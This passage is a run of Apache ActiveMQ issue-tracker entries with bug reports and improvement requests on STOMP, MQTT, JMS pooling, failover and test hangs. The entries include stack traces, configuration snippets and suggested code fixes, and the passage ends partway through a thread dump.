The subject of this task similiar as AMQ-2098. Bug still exists, and it can be reproduced according to steps below.This simple script written in PHP uses standard Stomp client$stomp       = new Stomp("tcp://localhost:61613", "admin", "admin");$stomp->subscribe("/topic/stats");$stomp->begin($transaction = microtime(true));$status = $stomp->send("/queue/ActiveMQ.Statistics.Destination.testqueue", "", Array("reply-to" => "/topic/stats", "persistent" => "true"));$message = $stomp->readFrame();$stomp->ack($message->headers["message-id"]);$stomp->commit($transaction);And in $message we"ll have empty body paramter. It"s because ActiveMQ returned message without body that"s show in a captured packets between ActiveMQ and PHP communication belowT 127.0.0.1:53988 -> 127.0.0.1:61613 [AP]CONNECTlogin:adminpasscode:adminT 127.0.0.1:53988 -> 127.0.0.1:61613 [AP].T 127.0.0.1:61613 -> 127.0.0.1:53988 [AP]CONNECTEDheart-beat:0,0session:ID:amneziac-59996-1402320672417-5:8server:ActiveMQ/5.9.1version:1.0.T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP]SUBSCRIBEack:clientdestination:/topic/statsactivemq.prefetchSize:1T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP].T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP]BEGINtransaction:1402321825.9952T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP].T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP]SENDreply-to:/topic/statspersistent:truedestination:/queue/ActiveMQ.Statistics.Destination.testqueueT 127.0.0.1:53988 -> 127.0.0.1:61613 [AP].T 127.0.0.1:61613 -> 127.0.0.1:53988 [AP]MESSAGEmessage-id:ID:amneziac-59996-1402320672417-2:1:0:0:8type:Advisorydestination:/topic/statstimestamp:1402321826311expires:0priority:4.T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP]ACKmessage-id:ID:amneziac-59996-1402320672417-2:1:0:0:8T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP].T 127.0.0.1:53988 -> 127.0.0.1:61613 [AP]COMMITtransaction:1402321825.9952T 127.0.0.1:53988 -> 127.0.0.1:61613 [AFP].DISCONNECT
issueID:AMQ-5222
type:Bug
changed files:
texts:Issue with Purge Inactive Destination feature
I enabled deletion of Inactive Queue for POC every 10 seconds<policyEntry queue=">" producerFlowControl="true" memoryLimit="20mb"   gcInactiveDestinations="true" inactiveTimoutBeforeGC="10000">.Now I start a Consumer Listener process..The Queue is created and then it is deleted though Consumer is still running and Active..I would expect this to should not be deleted as it still has active QueueLooking @ code BaseDestination->markForGC(long timeStamp) & BaseDestination->canGC() seems to be suspect based on usage from RegionBroker->purgeInactiveDestinations
issueID:AMQ-5223
type:Bug
changed files:
texts:activemq-jms-pool is missing OSGi metadata
Adding <packaging>bunde<packaging> fixes the issue
issueID:AMQ-5224
type:Bug
changed files:
texts:XA pooled connection factories are not recoverable
PooledConnectionFactory#setConnectionFactory hides the XAConnectionFactory interface which is used by the resource manager.
issueID:AMQ-5226
type:Bug
changed files:
texts:When create on start is set to true, the JMS Pool can return the same connection twice in a row
When the PooledConnectionFactory is configured to create connection on start, it can return the same connection twice in a row before moving on to returning other new connections which violates the round robin policy when there is more than one connection configured for pooling.
issueID:AMQ-5229
type:Improvement
changed files:
texts:Queue; be able to pause/resume dispatch of message to all consumers
It would be good to be able to pause/resume the dispatch of messages from a queue to the queues consumers.When the queue is "paused": NO messages sent to the associate consumers messages still to be enqueued on the queue ability to be able to browse the queue all the JMX counters for the queue to be available and correct.
issueID:AMQ-5231
type:Improvement
changed files:
texts:Failover Transport timeout option causes connection failures in some cases where it shouldn&#39;t
Originally added in AMQ-2061 the timeout option is used to cause a send of Message that"s gone out async to fail if the connection doesn"t come back in some amount of time.  The problem is that the option is currently applied to everything that goes through FailoverTransport oneway() and this can cause a Connection start where the broker is not up to fail regardless of the maxReconnectAttempts or startupMaxReconnectAttempts value configured for the transport. We need to refine the timeout logic to only apply to Message instances and not to other commands like ConnectionInfo so that a Connection start honors the normal failover transport reconnect configuration logic.
issueID:AMQ-5233
type:Bug
changed files:
texts:MQTT broker with ACL, try to connect using bad credential sends first connection event and next disconnect event to client
Configure broker with :    <amq:broker useJmx="false" persistent="false">        <amq:transportConnectors>            <amq:transportConnector name="mqtt" uri="${jms.brokerurl}">                    </amq:transportConnectors>        <amq:networkConnectors/>        <amq:plugins>            <amq:simpleAuthenticationPlugin>                <amq:users>                    <amq:authenticationUser username="test" password="test" groups="admins,guests,users" />                </amq:users>            </amq:simpleAuthenticationPlugin>            <amq:authorizationPlugin>                <amq:map>                    <amq:authorizationMap>                        <amq:authorizationEntries>                            <amq:authorizationEntry queue=">" read="admins" write="admins" admin="admins" />                            <amq:authorizationEntry topic=">" read="admins" write="admins" admin="admins" />                            <amq:authorizationEntry topic="ActiveMQ.Advisory.>" read="admins" write="admins" admin="admins"/>                        </amq:authorizationEntries>                    </amq:authorizationMap>                </amq:map>            </amq:authorizationPlugin>        </amq:plugins>    </amq:broker>Connecting with mosquittolib (C) with bad credential rise first "on_connection" event as the connection is OK, and next "on_disconnection" event. Expected behavior is failed connection with BAD CREDENTIAL reported error form broker.
issueID:AMQ-5237
type:Bug
changed files:
texts:Link stealing doesn&#39;t work for MQTT + Webscokets
Link stealing with existing clientid doesn"t work for MQTT WS.As per MQTT definition, same clientID should replace existing connection.Simple testing: Connect with MQTT WS client library ( Eclipse Paho JS) and connect-disconnect multiple times. It will give error of client already connected.
issueID:AMQ-5239
type:Improvement
changed files:ActiveMQServiceFactory.java
texts:Enable access to BrokerService instances
When creating broker instances using activemq-osgi, ActiveMQServiceFactory manages the named BrokerService instances.Currently it is not possible to access these instances, e.g. for querying purposes to retrieve statistics, etc. It would be great if one could do so.ActiveMQServiceFactory can be accessed via the ManagedServiceFactory (service.pid=org.apache.activemq.server). What is missing is for example an accessor method to the "brokers" field.
issueID:AMQ-5241
type:Bug
changed files:FailoverTransport.java
texts:Spurious WARN  FailoverTransport - Transport .. failed, reason: , attempting to automatically reconnect java.io.EOFException
Occasional spurious reconnect from Failover during normal close processing. Incorrectly reporting a problem2014-06-23 12:01:47,095 [0.1:61616@63805] - WARN  FailoverTransport              - Transport (tcp://localhost/127.0.0.1:61616@63805) failed, reason: , attempting to automatically reconnectjava.io.EOFException at java.io.DataInputStream.readInt(DataInputStream.java:375) at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:258) at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:221) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:213) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:695)Issue is broker response to shutdown info is closing broker end of the socket before client has chance to stop the local transport. So client gets eof before it closes and reports and tries to reconnect in error. Because we treat abortive disconnect as a warn event this can lead to confusion.
issueID:AMQ-5242
type:Bug
changed files:
texts:Most Stomp tests fail or hang on AIX
The stomp tests tend to hang on JDK6, or fail with an error like the one below on JDK7.  For now I"m going to update the pom to exclude them because they cause the JDK6 builds to hang.org.apache.activemq.transport.stomp.Stomp11NIOSSLTest.testSendMessageWithStandardHeadersEncodedFailing for the past 3 builds (Since Aborted#6 )Took 2.5 sec.add descriptionError MessageRemote host closed connection during handshakeStacktracejavax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake at com.ibm.jsse2.qc.a(qc.java:702) at com.ibm.jsse2.qc.h(qc.java:103) at com.ibm.jsse2.qc.a(qc.java:227) at com.ibm.jsse2.h.write(h.java:3) at java.io.OutputStream.write(OutputStream.java:86) at org.apache.activemq.transport.stomp.StompConnection.sendFrame(StompConnection.java:55) at org.apache.activemq.transport.stomp.Stomp11Test.testSendMessageWithStandardHeadersEncoded(Stomp11Test.java:707) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:94) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55) at java.lang.reflect.Method.invoke(Method.java:619) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27) at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55) at org.junit.rules.RunRules.evaluate(RunRules.java:20) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)Caused by: java.io.EOFException: SSL peer shut down incorrectly at com.ibm.jsse2.a.a(a.java:220) at com.ibm.jsse2.qc.a(qc.java:850) at com.ibm.jsse2.qc.h(qc.java:103) at com.ibm.jsse2.qc.a(qc.java:227) at com.ibm.jsse2.h.write(h.java:3) at java.io.OutputStream.write(OutputStream.java:86) at org.apache.activemq.transport.stomp.StompConnection.sendFrame(StompConnection.java:55) at org.apache.activemq.transport.stomp.Stomp11Test.testSendMessageWithStandardHeadersEncoded(Stomp11Test.java:707) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:94) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55) at java.lang.reflect.Method.invoke(Method.java:619) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27) at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55) at org.junit.rules.RunRules.evaluate(RunRules.java:20) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)
issueID:AMQ-5247
type:Improvement
changed files:AbstractJmxCommand.java
texts:Implementation forces to set plaintext user and password for activemq.jmx.<user/password>
Actually karaf based distributions like ServiceMix have user/password for activemq commands in plaintext files. It is recommended to crypt credential information in karaf but there is no possibility to do for activemq.jmx.*. One solution for this problem might be to let jmxUseLocal settable default to true. This way there is no need to set user/password in plaintext files. Karaf or better ServiceMix might provide encryption wrapper for the system properties via jasypt if needed.
issueID:AMQ-525
type:Bug
changed files:
texts:4.0 M4 IndexOutOfBoundException
Exception in thread "tcp://localhost/127.0.0.1:61636" java.lang.IndexOutOfBoundsException         at java.io.DataInputStream.readFully(DataInputStream.java:173)         at org.apache.activemq.openwire.BooleanStream.unmarshal(BooleanStream.java:88)         at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:213)         at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181)         at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)         at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-5251
type:Bug
changed files:Topic.java
Scheduler.java
texts:Scheduler missing some synchronization
the org.apache.activemq.thread.Scheduler.executePeriodically() method should be synchronized since it modifies the timerTasks map.
issueID:AMQ-5253
type:Bug
changed files:PolicyEntry.java
DestinationFilter.java
RegionBroker.java
BaseDestination.java
Destination.java
texts:Typo In settings parameter for policyEntries
I noticed that there is a typo in property used for deleting inactive destinations.In documentation example(http://activemq.apache.org/delete-inactive-destinations.html)"inactiveTimoutBeforeGC" used. Which has one letter missing in word "Timout". I tried to change property name to "inactiveTimeoutBeforeGC" and active mq failed to start afterwards, so seems there is typo in parameter name.
issueID:AMQ-5256
type:Bug
changed files:
texts:AMQP WARN  Transport Connection failed: java.io.IOException
concurrent AMQP connection, client hung on half closed connection, waiting for response to open.   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) - waiting on <7df15ba78> (a org.apache.qpid.amqp_1_0.transport.ConnectionEndpoint) at java.lang.Object.wait(Object.java:485) at org.apache.qpid.amqp_1_0.transport.ConnectionEndpoint.open(ConnectionEndpoint.java:154) - locked <7df15ba78> (a org.apache.qpid.amqp_1_0.transport.ConnectionEndpoint) - locked <7df15ba78> (a org.apache.qpid.amqp_1_0.transport.ConnectionEndpoint) at org.apache.qpid.amqp_1_0.client.Connection.<init>(Connection.java:284) at org.apache.qpid.amqp_1_0.client.Connection.<init>(Connection.java:143) at org.apache.qpid.amqp_1_0.jms.impl.ConnectionImpl.connect(ConnectionImpl.java:115) - locked <7df8bd048> (a java.lang.Object) at org.apache.qpid.amqp_1_0.jms.impl.ConnectionImpl.start(ConnectionImpl.java:284)Broker log contains:[ActiveMQ Transport: tcp:///127.0.0.1:64496@64488            ] - WARN  Transport     - Transport Connection to: tcp://127.0.0.1:64496 failed: java.io.IOException
issueID:AMQ-5258
type:Bug
changed files:PooledConnectionFactory.java
texts:Connection reference leak in PooledConnectionFactory leading to expired connections stuck in the pool
org.apache.activemq.jms.pool.PooledConnectionFactory creates a connection on startup without giving it back to the pool:    public void start() {        LOG.debug("Staring the PooledConnectionFactory: create on start = {}", isCreateConnectionOnStartup());        stopped.set(false);        if (isCreateConnectionOnStartup()) {            try {                // warm the pool by creating a connection during startup                createConnection();            } catch (JMSException e) {                LOG.warn("Create pooled connection during start failed. This exception will be ignored.", e);            }        }    }So no close() method of PooledConnection is called and so no decrementReferenceCount is called on ConnectionPool. So referenceCount never becomes 0.Later on if an exception occurs and hasExpired of ConnectionPool is set to true, the connection will not be closed since expiredCheck() method of ConnectionPool always compares referenceCount with 0 and does close() only if it is 0.So we have a dead ConnectionPool instance and all usages result in "XXX closed" errors.The fix would be to add call to close() just after doing createConnection() in PooledConnectionFactory#start() to make referenceCount go to 0. Something like this:    public void start() {        LOG.debug("Staring the PooledConnectionFactory: create on start = {}", isCreateConnectionOnStartup());        stopped.set(false);        if (isCreateConnectionOnStartup()) {            try {                // warm the pool by creating a connection during startup                createConnection().close(); // <--- makes sure referenceCount goes to 0            } catch (JMSException e) {                LOG.warn("Create pooled connection during start failed. This exception will be ignored.", e);            }        }    }
issueID:AMQ-526
type:Test
changed files:
texts:get TwoBrokerMulticastQueueTest to work
currently, some test case hangs, some fails.
issueID:AMQ-5262
type:Bug
changed files:JmsConnector.java
texts:ActiveMQ hangs on shutdown when JMS Bridge is created
We are having a problem with ActiveMQ hanging on shutdown.  Here is the scenario, we have a stand alone application that runs an embedded ActiveMQ which creates a JMS Queue Bridge via Spring configs. When we call shutdown, the TCPTransport that connects the JMS Queue Bridge does not shutdown, it hangs on java.net.SocketInputStream.socketRead0(). java.lang.Thread.State: RUNNABLE at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.read(SocketInputStream.java:129) at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50) at org.apache.activemq.transport.tcp.TcpTransport$2.fill(TcpTransport.java:604) at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58) at org.apache.activemq.transport.tcp.TcpTransport$2.read(TcpTransport.java:589) at java.io.DataInputStream.readInt(DataInputStream.java:370) at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:275) at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:221) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:213) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:662)Digging around on the forums and the issue tracker, the work around seems to add a parameter to the URI (Ex - tcp://localhost:60606?daemon=true).  According to this StackOverflow posting (http://stackoverflow.com/questions/2213340/what-is-daemon-thread-in-java) which quotes from Java Concurrency in Practice  When a new thread is created it inherits the daemon status of its parent. Normal thread and daemon threads differ in what happens when they exit. When the JVM halts any remaining daemon threads are abandoned: *finally blocks are not executed*, stacks are not unwound - JVM just exits. Due to this reason daemon threads should be used sparingly and it is dangerous to use them for tasks that might perform any sort of I/O.So, making the Socket that connects the JMS Queue Bridge a Daemon thread, seems to be the wrong solution.  I was trying to debug the initialization of ActiveMQ, and noticed the org.apache.activemq.network.jms.JmsConnector class has a stop() method on it.  I believe this class creates the connection for the JMS Bridge, right?  If so, the stop method does not seem to shutdown the connection properly. public void stop() throws Exception {        if (started.compareAndSet(true, false)) {            ThreadPoolUtils.shutdown(connectionSerivce);            connectionSerivce = null;            for (DestinationBridge bridge : inboundBridges) {                bridge.stop();            }            for (DestinationBridge bridge : outboundBridges) {                bridge.stop();            }            LOG.info("JMS Connector {} stopped", getName());        }        }The question I have is why is the stop() method relying on the ThreadPoolUtils.shutdown(connectionSerivce) and NOT calling close() on the Connections first? For example:public void stop() throws Exception {        if (started.compareAndSet(true, false)) {   foreignConnection.get().close();   localConnection.get().close();               ThreadPoolUtils.shutdown(connectionSerivce);            connectionSerivce = null;            for (DestinationBridge bridge : inboundBridges) {                bridge.stop();            }            for (DestinationBridge bridge : outboundBridges) {                bridge.stop();            }            LOG.info("JMS Connector {} stopped", getName());        }        }It was a little difficult to follow the code, so I may be missing something.  BUT shouldn"t the connections close first?  Or am I looking in the wrong place.  I have created a small project that creates this scenario.https://github.com/pminearo/activemq-shutdown-bug.gitThis was done with ActiveMQ 5.9.  Though, since this bug has been around for quite some time, it most likely is still in 5.10, 5.11, and 6.0.
issueID:AMQ-5264
type:Improvement
changed files:
texts:Allow optional manual transaction management on a rar managedConnection
In https://github.com/apache/activemq/commit/adb49f562725087865ded9a773ee6901423c870bthe jee semantics were tightened up to ignore args passed to create session.see: http://mail-archives.apache.org/mod_mbox/activemq-users/201407.mbox/%3CCAH%2BvQmPgMYGmWB_QX8gcFqMOcFa9mGkZEDjhEiASpbUKen3f4w%40mail.gmail.com%3EIn cases where spring is uses with the rar outside of ee, it is sensible to retain the standard jms semantics and respect that args. The app is then responsible for ensuring transaction completion as normal.
issueID:AMQ-5265
type:Bug
changed files:MBeanBridgeDestination.java
texts:JMX destination entires fail due to race condition in MBeanBridgeDestination
JMX statistics on destinations creates a race condition in the MBeanBridgeDestination"s onInboundMessage, onOutboundMessage, and the purgeInactiveDestinationView task.  If the task fires and removes the objectName while the onInboundMessage or onOutboundMessage fires, it will spit out warnings of it already being created if multiple threads are running.  The fix is to properly synchronize in the purgeInactiveDestinationView and also be sure it cleans up itself in the destinationObjectNameMap.Patch is attached as is a git pull request (for whatever is easier)
issueID:AMQ-5266
type:Bug
changed files:
texts:Stuck Messages in Single Broker when using JDBC Persistent Store
With multiple concurrent producer transactions and active fast consumers it is possible to get out of order db insertions and scans resulting in a skipped dispatch. This scenario is exacerbated when the cursor cache is disabled because every dispatch will potentially result in a scan.the JDBC store maps jms transaction to jdbc connection transactions at the point of a commit and these can occur in parallel. The broker tracks a sequenceId to ensure ordering relative to a jms connection and  scans respect that order but there is currently nothing to stop a scan seeing a later sequence before an earlier sequence is stored. In other words, inserts can race, but the reader needs to limit a read to the lowest outstanding sequence.On a restart, any stuck messages will be replayed correctly, because the cursor transient state w.r.t to the last sequence id read will be reset.
issueID:AMQ-5267
type:Bug
changed files:
texts:Some MQTT tests hang on HP-UX
The MQTTNioTest and MQTTSSLTest test suites hang when run under Jenkins on HP-UX.  The tests all have timeouts, but the hang occurs in FailOnTimeout, as shown in the stack trace below.jenkins@srt-hpux:/fuse/jenkins/>jstack 256542014-07-10 04:24:00Full thread dump Java HotSpot(TM) Server VM (24.51-b03-jre1.7.0.09-rc1 mixed mode):"Attach Listener" daemon prio=8 tid=0x00595000 nid=148 lwp_id=2776392 waiting on condition &#91;0x00000000&#93;   java.lang.Thread.State: RUNNABLE"InactivityMonitor ReadCheck" daemon prio=8 tid=0x00595a00 nid=147 lwp_id=2776353 in Object.wait() &#91;0x31e00000&#93;   java.lang.Thread.State: TIMED_WAITING (on object monitor)        at java.lang.Object.wait(Native Method) waiting on <0x3aabfda8> (a java.util.TaskQueue)        at java.util.TimerThread.mainLoop(Timer.java:552) locked <0x3aabfda8> (a java.util.TaskQueue)        at java.util.TimerThread.run(Timer.java:505)"ActiveMQ BrokerService&#91;localhost&#93; Task-2" daemon prio=8 tid=0x00595600 nid=146 lwp_id=2776352 waiting on condition &#91;0x31f80000&#93;   java.lang.Thread.State: TIMED_WAITING (parking)        at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x3aac0b80> (a java.util.concurrent.SynchronousQueue$TransferStack)        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)        at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460)        at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359)        at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942)        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)        at java.lang.Thread.run(Thread.java:744)"ActiveMQ BrokerService&#91;localhost&#93; Task-1" daemon prio=8 tid=0x01170600 nid=145 lwp_id=2776351 waiting on condition &#91;0x32100000&#93;   java.lang.Thread.State: TIMED_WAITING (parking)        at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x3aac0b80> (a java.util.concurrent.SynchronousQueue$TransferStack)        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)        at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460)        at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359)        at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942)        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)        at java.lang.Thread.run(Thread.java:744)"ActiveMQ Transport Server: mqtt+nio://localhost:0?" daemon prio=8 tid=0x01344c00 nid=144 lwp_id=2776350 runnable &#91;0x32280000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3aac13d0> (a sun.nio.ch.Util$2) locked <0x3aac13c0> (a java.util.Collections$UnmodifiableSet) locked <0x3aac1008> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at sun.nio.ch.ServerSocketAdaptor.accept(ServerSocketAdaptor.java:121) locked <0x3aac1260> (a java.lang.Object)        at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:301)        at java.lang.Thread.run(Thread.java:744)"ActiveMQ Transport Server Thread Handler: mqtt+nio://localhost:0?" daemon prio=8 tid=0x012ffa00 nid=143 lwp_id=2776349 waiting on condition &#91;0x324c0000&#93;   java.lang.Thread.State: TIMED_WAITING (parking)        at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x3aac8368> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2082)        at java.util.concurrent.LinkedBlockingQueue.poll(LinkedBlockingQueue.java:467)        at org.apache.activemq.transport.tcp.TcpTransportServer$1.run(TcpTransportServer.java:375)        at java.lang.Thread.run(Thread.java:744)"ActiveMQ Broker&#91;localhost&#93; Scheduler" daemon prio=8 tid=0x01226a00 nid=142 lwp_id=2776348 in Object.wait() &#91;0x32dc0000&#93;   java.lang.Thread.State: TIMED_WAITING (on object monitor)        at java.lang.Object.wait(Native Method) waiting on <0x3aac3d50> (a java.util.TaskQueue)        at java.util.TimerThread.mainLoop(Timer.java:552) locked <0x3aac3d50> (a java.util.TaskQueue)        at java.util.TimerThread.run(Timer.java:505)"Thread-44" prio=8 tid=0x008f5a00 nid=141 lwp_id=2776347 waiting on condition &#91;0x32fc0000&#93;   java.lang.Thread.State: TIMED_WAITING (parking)        at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x650a1ea0> (a java.util.concurrent.CountDownLatch$Sync)        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(AbstractQueuedSynchronizer.java:1033)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1326)        at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:282)        at org.fusesource.mqtt.client.Promise.await(Promise.java:80)        at org.fusesource.mqtt.client.BlockingConnection.receive(BlockingConnection.java:96)        at org.apache.activemq.transport.mqtt.FuseMQQTTClientProvider.receive(FuseMQQTTClientProvider.java:73)        at org.apache.activemq.transport.mqtt.MQTTTest.testSendAtLeastOnceReceiveAtMostOnce(MQTTTest.java:219)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)        at java.lang.reflect.Method.invoke(Method.java:606)        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47)        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44)        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)        at org.junit.internal.runners.statements.FailOnTimeout$StatementThread.run(FailOnTimeout.java:74)"ActiveMQ NIO Worker 3" daemon prio=8 tid=0x0143a800 nid=86 lwp_id=2776292 waiting on condition &#91;0x31ec0000&#93;   java.lang.Thread.State: TIMED_WAITING (parking)        at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x3a877bd0> (a java.util.concurrent.SynchronousQueue$TransferStack)        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)        at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460)        at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359)        at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942)        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)        at java.lang.Thread.run(Thread.java:744)"Selector Worker: 22" daemon prio=8 tid=0x00b1c000 nid=36 lwp_id=2776220 runnable &#91;0x321c0000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3aac8938> (a 